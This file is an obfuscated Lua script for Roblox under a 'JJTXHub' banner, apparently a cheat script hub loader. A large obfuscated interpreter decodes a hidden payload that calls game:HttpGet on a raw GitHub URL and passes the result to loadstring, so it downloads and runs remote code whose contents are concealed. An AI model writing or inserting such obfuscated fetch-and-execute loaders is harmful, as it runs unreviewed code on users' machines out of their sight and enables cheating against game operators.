--[[

░░░░░██╗░░░░░██╗████████╗██╗░░██╗██╗░░██╗██╗░░░██╗██████╗░
░░░░░██║░░░░░██║╚══██╔══╝╚██╗██╔╝██║░░██║██║░░░██║██╔══██╗
░░░░░██║░░░░░██║░░░██║░░░░╚███╔╝░███████║██║░░░██║██████╦╝
██╗░░██║██╗░░██║░░░██║░░░░██╔██╗░██╔══██║██║░░░██║██╔══██╗
╚█████╔╝╚█████╔╝░░░██║░░░██╔╝╚██╗██║░░██║╚██████╔╝██████╦╝
░╚════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v87=0;local v88;while true do if (v87==0) then v88=v2(v0(v30,16));if v19 then local v120=0;local v121;while true do if (v120==1) then return v121;end if (v120==0) then v121=v5(v88,v19);v19=nil;v120=1;end end else return v88;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v89=(v31/((5 -(1068 -(68 + 997)))^(v32-(1 + (1270 -(226 + 1044))))))%((5 -3)^(((v33-(1 -0)) -(v32-(1638 -(1523 + 114)))) + (2 -(4 -3)))) ;return v89-(v89%(118 -(32 + 85))) ;else local v90=(621 -(555 + 64))^(v32-(932 -(857 + 74))) ;return (((v31%(v90 + v90))>=v90) and (569 -(367 + 201))) or (0 -0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 + 0 ;local v36;local v37;while true do if (v35==(1 + 0)) then return (v37 * (1213 -(892 + 65))) + v36 ;end if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + (3 -1) ;v35=351 -(87 + (443 -(67 + 113))) ;end end end local function v23() local v38=0 + 0 ;local v39;local v40;local v41;local v42;while true do if (v38==(1 -0)) then return (v42 * (41190819 -(14222049 + 10191554))) + (v41 * ((63387 -15188) + 17337)) + (v40 * 256) + v39 ;end if (v38==(0 -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + (955 -(802 + 150)) );v18=v18 + (11 -7) ;v38=1;end end end local function v24() local v43=v23();local v44=v23();local v45=1;local v46=(v20(v44,1188 -(1069 + 118) ,45 -25 ) * ((3 -1)^(6 + 26))) + v43 ;local v47=v20(v44,37 -16 ,31 + 0 );local v48=((v20(v44,823 -(368 + 423) )==(3 -2)) and  -(19 -(10 + (1146 -(116 + 1022))))) or (3 -2) ;if (v47==(442 -(416 + (108 -82)))) then if (v46==(0 -0)) then return v48 * (0 + 0 + 0) ;else local v109=0 -(0 -0) ;while true do if (0==v109) then v47=773 -(201 + 571) ;v45=0;break;end end end elseif (v47==(2485 -(145 + 293))) then return ((v46==0) and (v48 * (1/((1526 -1096) -(44 + 386))))) or (v48 * NaN) ;end return v8(v48,v47-(2509 -(998 + 488)) ) * (v45 + (v46/((1 + (860 -(814 + 45)))^(43 + 9)))) ;end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==0) then return "";end end v50=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;local v51={};for v67=1 + 0 , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 0;end)();local v92=(function() return;end)();local v94=(function() return;end)();while true do if (v91==0) then local v114=(function() return 0;end)();while true do if (v114~=0) then else v92=(function() return v93();end)();v94=(function() return nil;end)();v114=(function() return 1 + 0 ;end)();end if (1==v114) then v91=(function() return  #"\\";end)();break;end end end if ( #"\\"~=v91) then else if (v92== #"!") then v94=(function() return v93()~=(0 -0) ;end)();elseif (v92==(1 + 1)) then v94=(function() return v95();end)();elseif (v92== #"xxx") then v94=(function() return v96();end)();end v97[v98]=(function() return v94;end)();break;end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v53=(function() return function(v99,v100,v101) local v102=(function() return 0;end)();while true do if (v102==(0 -0)) then local v116=(function() return 0 + 0 ;end)();while true do if (v116~=(1474 -(1329 + 145))) then else v99[v100-#"~" ]=(function() return v101();end)();return v99,v100,v101;end end end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"~",v58 do FlatIdent_781F8,Type,v21,Cons,v24,v25,v59,v69=(function() return v52(FlatIdent_781F8,Type,v21,Cons,v24,v25,v59,v69);end)();end v57[ #"asd"]=(function() return v21();end)();for v70= #">",v23() do local v71=(function() return v21();end)();if (v20(v71, #"|", #"~")==0) then local v105=(function() return 1850 -(1409 + 441) ;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v105~=1) then else v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==(0 + 0)) then local v123=(function() return 0;end)();local v124=(function() return;end)();while true do if (v123==(438 -(262 + 176))) then v124=(function() return 0;end)();while true do if (v124==(1721 -(345 + 1376))) then v108[ #"xnx"]=(function() return v22();end)();v108[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v106== #"}") then v108[ #"19("]=(function() return v23();end)();elseif (v106==2) then v108[ #"-19"]=(function() return v23() -(2^16) ;end)();elseif (v106== #"xxx") then local v163=(function() return 688 -(198 + 490) ;end)();local v164=(function() return;end)();while true do if (0~=v163) then else v164=(function() return 0;end)();while true do if (v164~=(0 -0)) then else v108[ #"xnx"]=(function() return v23() -((4 -2)^(1222 -(696 + 510))) ;end)();v108[ #"0836"]=(function() return v22();end)();break;end end break;end end end v105=(function() return 2;end)();end if (v105==(0 -0)) then v106=(function() return v20(v71,1264 -(1091 + 171) , #"91(");end)();v107=(function() return v20(v71, #"?id=",1 + 5 );end)();v105=(function() return 1;end)();end if (v105~=(6 -4)) then else if (v20(v107, #"]", #",")== #">") then v108[2]=(function() return v59[v108[6 -4 ]];end)();end if (v20(v107,2,2)~= #"/") then else v108[ #"19("]=(function() return v59[v108[ #"xxx"]];end)();end v105=(function() return 3;end)();end if ((377 -(123 + 251))==v105) then if (v20(v107, #"gha", #"-19")~= #"|") then else v108[ #".com"]=(function() return v59[v108[ #"?id="]];end)();end v54[v70]=(function() return v108;end)();break;end end end end for v72= #"|",v23() do v55,v72,v28=(function() return v53(v55,v72,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[(9 -5) -3 ];local v65=v61[700 -(208 + 490) ];local v66=v61[1 + 2 ];return function(...) local v73=v64;local v74=v65;local v75=v66;local v76=v27;local v77=1 + 0 ;local v78= -1;local v79={};local v80={...};local v81=v12("#",...) -(837 -(660 + 176)) ;local v82={};local v83={};for v103=(0 -0) + 0 ,v81 do if (v103>=v75) then v79[v103-v75 ]=v80[v103 + 1 ];else v83[v103]=v80[v103 + 1 ];end end local v84=(v81-v75) + ((181 + 22) -((714 -(271 + 429)) + 173 + 15)) ;local v85;local v86;while true do local v104=675 -(534 + 141) ;while true do if ((2950==2950) and (v104==(0 + 0))) then v85=v73[v77];v86=v85[1 + 0 ];v104=1 + 0 ;end if (v104==(1 -0)) then if (v86<=(609 -(268 + 335))) then if ((v86<=((1502 -(1408 + 92)) -0)) or (4723<3298)) then if (v86<=0) then v83[v85[5 -(293 -(60 + 230)) ]]=v85[2 + 1 ];elseif ((1136>=154) and (v86==(1 + 0))) then v83[v85[398 -(115 + 281) ]]=v63[v85[6 -3 ]];else local v134=0 + (572 -(426 + 146)) ;local v135;while true do if (v134==(0 -0)) then v135=v85[7 -5 ];v83[v135]=v83[v135](v13(v83,v135 + (868 -(550 + 317)) ,v78));break;end end end elseif (v86<=(5 -(1 + 0))) then if (v86==((1459 -(282 + 1174)) -0)) then local v136=0 -0 ;local v137;local v138;local v139;local v140;while true do if ((v136==1) or (271>4748)) then v78=(v139 + v137) -(286 -(134 + 151)) ;v140=1665 -(970 + 695) ;v136=3 -(812 -(569 + 242)) ;end if (v136==(1990 -(582 + (4055 -2647)))) then v137=v85[2];v138,v139=v76(v83[v137](v13(v83,v137 + 1 ,v85[10 -7 ])));v136=1;end if (v136==((1290 -(993 + 295)) -0)) then for v171=v137,v78 do v140=v140 + 1 + 0 ;v83[v171]=v138[v140];end break;end end else local v141=v85[2];local v142,v143=v76(v83[v141](v13(v83,v141 + (3 -2) ,v85[1827 -(1195 + 629) ])));v78=(v143 + v141) -(1 -0) ;local v144=241 -(187 + 54) ;for v165=v141,v78 do v144=v144 + (781 -(162 + 618)) ;v83[v165]=v142[v144];end end elseif (v86>(4 + 1)) then v83[v85[2 + 0 ]]=v63[v85[6 -(1 + 2) ]];else do return;end end elseif (v86<=(14 -5)) then if (v86<=((1172 -(418 + 753)) + 6)) then do return;end elseif ((4740>=3152) and (v86==((627 + 1017) -(1373 + 263)))) then v83[v85[1002 -(451 + 549) ]]();else v83[v85[1 + 0 + 1 ]]();end elseif (v86<=(16 -5)) then if ((v86==(16 -6)) or (2578>=3390)) then v83[v85[1386 -(746 + 638) ]]=v85[2 + 1 ];else local v149=v85[2];local v150=v83[v85[4 -(1025 -(706 + 318)) ]];v83[v149 + ((101 + 241) -(218 + 123)) ]=v150;v83[v149]=v150[v85[1585 -(1535 + 46) ]];end elseif ((41<=1661) and (v86>((1263 -(721 + 530)) + 0))) then local v154=v85[1 + 1 ];v83[v154]=v83[v154](v13(v83,v154 + (561 -(306 + 254)) ,v78));else local v156=v85[1 + 1 ];local v157=v83[v85[5 -(1273 -(945 + 326)) ]];v83[v156 + 1 + 0 ]=v157;v83[v156]=v157[v85[(2000 -(406 + 123)) -(899 + 568) ]];end v77=v77 + 1 + 0 ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403423O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F733O68746F76662F6F4O682F6D61696E2F636865632O6B65792E6C756100083O0012063O00013O001206000100023O00200B00010001000300122O000300044O0003000100034O000D5O00022O00083O000100012O00073O00017O00",v9(),...);
